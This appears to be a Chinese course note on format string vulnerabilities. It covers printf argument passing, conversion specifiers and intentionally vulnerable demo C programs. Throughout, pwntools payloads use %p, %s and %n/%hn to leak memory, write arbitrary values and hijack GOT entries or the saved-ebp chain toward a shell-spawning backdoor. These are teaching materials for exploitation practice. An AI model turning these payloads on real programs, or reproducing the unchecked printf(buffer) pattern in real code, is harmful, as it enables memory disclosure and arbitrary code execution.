# 第 8 天：格式化字符串漏洞

## 可执行文件的保护手段

### Checksec

Pwntools 的 Checksec 可以查看某个程序的保护手段。

`pwn checksec xxx` 或者 `checksec xxx`：会显示这个程序的架构、RELRO、Stack、NX、PIE 情况。

### 综合型保护手段 ASLR

`/proc/sys/kernel/randomize_va_space`

- 栈地址随机。
- 堆的基地址随机。
- 如果同时开启了 PIE：各个 mapped 的段加载基地址也会随机。

## 为什么有格式化字符串漏洞？

### printf 原理：缺省参数

`int printf(const char *format, ...);`

比如：

```cpp
char s[] = "AAA";
int number = 0xdead;
printf("string is %s, int is %d\n", s, number);
//     |<---  format string  --->|  |<--- args...
```

### printf 参数的行为准备（32 位）

```cpp
int main()
{
	int a = 1, b = 2;
	char c = 'A', d = 'B';
	char e[10] = "hello";
	char f[10] = "world";
	printf("%d %d %c %c %s %s\n", a, b, c, d, e, f);
	return 0;
}
```

```asm
push eax
push ebx
push ecx
push edx
...
call printf
```

```plain
esp+00: = ret address
esp+04: -> format string
esp+08: = 1
esp+0c: = 2
esp+10: = 'A'
esp+14: = 'B'
esp+18: -> "hello"
esp+1c: -> "world"
```

参数被全部压进了栈里面。

### printf 参数的行为准备（64 位）

```cpp
int main()
{
	int a = 1, b = 2;
	char c = 'A', d = 'B';
	char e[10] = "hello";
	char f[10] = "world";
	printf("%d %d %c %c %s %s\n", a, b, c, d, e, f);
	return 0;
}
```

```asm
push ...
mov rsi
mov rdx
mov ...
...
call printf
```

```plain
rdi -> format string
rsi = 1
rdx = 2
...
esp+00: = ret address
esp+08: -> "world"
```

rdi，rsi，rdx，rcx，r8，r9 六个寄存器会首先承担传递参数的责任。

### 格式化字符串核心：转换说明 Conversion Specification

`%[parameter][flags][field width][.precision][length]type`

- %：一个象征。
- parameter：N$，指定第 N 个参数（从 1 开始）。
- field width：输出的最小长度。
- precision：输出的最大长度。
- length：长度改变标识。比如 hh 是输出一个字节长，h 是输出两个字节长。
- type：说明符。

#### 指定参数

```cpp
printf("%4$d", 1, 2, 3, 4); // 4
```

#### 说明符

- d，i：有符号整数。
- o，u，x，X：无符号 8 进制、无符号十进制、无符号 16 进制（小写字母或大写字母）。
- e：科学计数法。
- f，F：单浮点数。
- c：单字符。
- s：字符串。
- p：以地址打印。比如 printf("%p", a) 会把 a 的值当作一个地址来打印，而 printf("%p", &a) 就会打印 a 的地址。

```cpp
int x = 114514;
int *ptr = &x;
printf("The address is: %p, the value is %d", ptr, *ptr);
// The address is: 0x0000019198e0, the value is 114514
```

### FSB 漏洞的历史

`printf("%s", "hello, world!");`

似乎可以少写一点？

`printf("hello, world!");`

但是，如果我们输出的不仅是“hello, world!”……

```cpp
char s[20];
scanf("%20s", s);
printf(s);
```

当 printf 的格式化串中的转换说明和后续的变参没有正确对应时，format string bug 就会发生!

- printf("%d %d", a);
- printf("%s");
- printf("%d", a, b);

它们会输出什么呢……？

如果寄存器用完了（32 位下没有），它就会从它的存储格式化串的地址的上面一个的地方开始，从栈上一个一个拿数据！

也就是说，如果格式化串存储在栈上，拿数据也可以拿到自己的格式化串头上来！这会带来什么影响呢？

## 格式化字符串漏洞的利用

- 栈上 FSB 利用：攻击输入会影响栈上数据。攻击者伪造转换说明的时候还可以伪造对应的变参，可控性极强。
- 非栈上 FSB 利用：攻击输入没法直接影响栈上的内容。

## 栈上 FSB 应用

目标：

- 任意读：泄露敏感信息；泄露栈地址；泄露堆地址；泄露程序段地址；泄露 libc 地址；泄露各种不应该看到的东西……
- 任意写：劫持和控制流有关的对象，如 GOT 表等……

### 泄露栈上已有数据

```cpp
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
	char key_in_stack[32] = "sensitive key";
	char buffer[512] = {0};

	scanf("%s", buffer);
	getchar();
	printf(buffer);

	return 0;
}
```

```python
from pwn import *
# from binascii import unhexlify

context.arch = "i386"
context.log_level = "debug"

p = process("./demo1")
# gdb.attach(p)
payload = b"FUCK" + b"%$11p" # 格式化字符串在栈的偏移 11 处

p.sendline(payload)
p.recvuntil("FUCK")
content = p.recv()
# print(unhexlify(content[2:])[::-1])
print(u32(content))

p.interactive()
```

### 通过 %s 泄露非栈上内容

```cpp
#include <stdio.h>
#include <stdlib.h>

char key_in_global[32] = "verysecure";

int main(int argc, char* argv[])
{
	char buffer[512] = {0};

	scanf("%s", buffer);
	getchar();
	printf(buffer);

	return 0;
}
```

- 首先 readelf 获取 data 段字符串地址。
- 可以用特定字符串 AAAA 等找到 call printf 时栈与存放格式化字符串的距离，用 %p 来完成定位。
- 将特定串的内容换成目标地址，确保 %p 可以输出该地址。
- 将 %p 换成 %s 即可完成 leak。

```python
payload = p32(tarloc) + b"%11$s" # 格式化字符串在栈的偏移 11 处
```

### “写”能力

说明符 %n：把当前已经写掉的字符数量存储到一个整数变量中。

```cpp
int main(int argc, char* argv[])
{
	int print_character_count = 0;
	char some_str[] = "totally agree";

	printf("What a nice day, we are so happy"
		   " here to learn advanced pwn class!!"
		   " %s ...%n\n", some_str, &print_character_count);

	printf("last printf output %d chars\n", print_character_count);
	
	return 0;
}
```

```plain
What a nice day, we are so happy here to learn advanced pwn class!! totally agree ...
last printf output 85 chars
```

也就是说，给定 %n，我们也可以在栈上布置任意地址，让 %n 将这个地址作为一个 int* 指针并去更改内容。

> %hn，%hhn：以更小的粒度进行修改（short，char）。
>
> 如果你要写一个很大的数，可以把它用这种方式拆开，而不是搞一个很长的字符串。
>
> 以及，%Nc。

```cpp
char key_in_global[32] = "verysecure";

int main(int argc, char* argv[])
{
	char buffer[512] = {0};

	printf("before fsb, key: %s\n", key_in_global);

	scanf("%s", buffer);
	getchar();
	printf(buffer);

	printf("after fsb, key: %s\n", key_in_global);

	return 0;
}
```

```python
payload = p32(tarloc) + b'%' + str(tarval - 4).encode() + b"c%11$n"
```

### 通过任意写去覆盖控制流相关变量

- 劫持 GOT 表
- 劫持其它……
	- libc 里面的 hook
	- 和程序逻辑有关的变量
	- ……

GOT 表的工作原理：第一次调用的时候，先跳 PLT，PLT 再跳 GOT。此时 GOT 内容还不正确，只写了一条跳回去 PLT 的指令。跳回 PLT 后进入的控制流会开始指挥，把正确的函数地址给 GOT。以后到 GOT 的时候就直接跳就好了。

那么，如果我们先行一步，把 GOT 表改了的话……

```cpp
int main(int argc, char* argv[])
{
	char buffer[512] = {0};

	scanf("%s", buffer);
	getchar();
	printf(buffer);

	exit(0);
}

void backdoor(void)
{
	printf("Hi Backdoor!\n");
	system("/bin/sh");
}
```

```python
# 在 tarloc（4 字节长）写一组 tarval。tarloc 是某个要执行的函数的 GOT 表的位置，tarval 是后门函数的位置。
payload = p32(tarloc) + p32(tarloc + 2)
payload += b'%' + str(tarval1 - 8).encode() + b"c%11$hn"
payload += b'%' + str(tarval2 - tarval1 + 0x10000).encode() + b"c%12$hn" # 如果有溢出
```

### 一次 printf 不够？

那就构造程序的无限循环。

- 劫持控制流，重新回到 main。
- 写 __fini_array 对象（这啥？）。
- 改栈上的返回地址。

## 非栈上 FSB 应用

核心：复用栈上的指针。

buffer 不在栈上时，泄露栈上的内容是依旧可以的，但是难以自行直接构造出地址，来对应 %s 和 %n。

但是只要栈上有可控的指针，就可以实现想要的内容！

比如，栈上有指针 ptrA，指向另外一个已知位置的 ptrB。那么可以借助 %n + ptrA 把 ptrB 覆盖成一个理想指针 ptrC，然后再借助 %s/%n + ptrB(ptrC) 实现任意读写。

这样的 ptrA、ptrB 存在吗？……不就是 rbp 嘛……！

```asm
push rbp
mov rbp, rsp
```

下面是一个例子。

```cpp
char string[256];

void backdoor()
{
    printf("Backdoor!\n");
    system("/bin/sh");
}

void vul()
{
    int i;
    for(i = 0; i < 100; i++)
    {
        scanf("%256s", string);
        printf(string);
        fflush(stdout);
    }
}

void wrapper()
{
    printf("This is a wrapper\n");
    vul();
}

int main(void)
{
    wrapper();

    return 0;
}
```

```gdb
gef➤  tele $esp
0xffffcfcc│+0x0000: 0x8049235  →  <vul+67> add esp, 0x10	 ← $esp
0xffffcfd0│+0x0004: 0x804c060  →  "FUCK"
0xffffcfd4│+0x0008: 0x804c060  →  "FUCK"
0xffffcfd8│+0x000c: 0x804a020  →  "This is a wrapper"
0xffffcfdc│+0x0010: 0x80491fe  →  <vul+12> add ebx, 0x2e02
0xffffcfe0│+0x0014: 0xffffd0d4  →  0xffffd29e  →  "/home/iotang/..."
0xffffcfe4│+0x0018: 0xf7ffcb80  →  0x00000000
0xffffcfe8│+0x001c: 0xffffd008  →  0xffffd018  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000
0xffffcfec│+0x0020: 0x00000000
0xffffcff0│+0x0024: 0x804a020  →  "This is a wrapper"
0xffffcff4│+0x0028: 0x804c000  →  0x804bf10  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
0xffffcff8│+0x002c: 0xffffd008  →  0xffffd018  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000	 ← $ebp
0xffffcffc│+0x0030: 0x8049287  →  <wrapper+42> nop 
0xffffd000│+0x0034: 0x00000001
0xffffd004│+0x0038: 0xf7fa2000  →  0x00229dac
0xffffd008│+0x003c: 0xffffd018  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000
0xffffd00c│+0x0040: 0x80492a2  →  <main+21> mov eax, 0x0
0xffffd010│+0x0044: 0xffffd29e  →  "/home/iotang/..."
0xffffd014│+0x0048: 0x000070 ("p"?)
0xffffd018│+0x004c: 0xf7ffd020  →  0xf7ffda40  →  0x00000000
0xffffd01c│+0x0050: 0xf7d99519  →   add esp, 0x10
0xffffd020│+0x0054: 0x00000001
0xffffd024│+0x0058: 0xffffd0d4  →  0xffffd29e  →  "/home/iotang/..."
0xffffd028│+0x005c: 0xffffd0dc  →  0xffffd2c3  →  "SHELL=..."
0xffffd02c│+0x0060: 0xffffd040  →  0xf7fa2000  →  0x00229dac
0xffffd030│+0x0064: 0xf7fa2000  →  0x00229dac
0xffffd034│+0x0068: 0x804928d  →  <main+0> push ebp
0xffffd038│+0x006c: 0x00000001
0xffffd03c│+0x0070: 0xffffd0d4  →  0xffffd29e  →  "/home/iotang/..."
0xffffd040│+0x0074: 0xf7fa2000  →  0x00229dac
```

看那个 $ebp 串起来的链！

```python
payload = b"%7$p"
p.sendline(payload) # 第一次 printf：拿到 ebp。

p.recvline()
stackaddr = int(p.recv(), 16)
taraddr = stackaddr - 0x10
payload2 = b'%' + str(taraddr & 0xffff).encode() + b"c%7$hn"
p.sendline(payload2) # 第二次 printf：确定攻击对象。

payload3 = b'%' + str(backaddr & 0xffff).encode() + b"c%??$hn"
p.sendline(payload3) # 第三次 printf：修改成后门地址。
```

（有现成的轮子：pwntools: pwnlib.fmtstr。[去看看](https://docs.pwntools.com/en/stable/fmtstr.html)。）
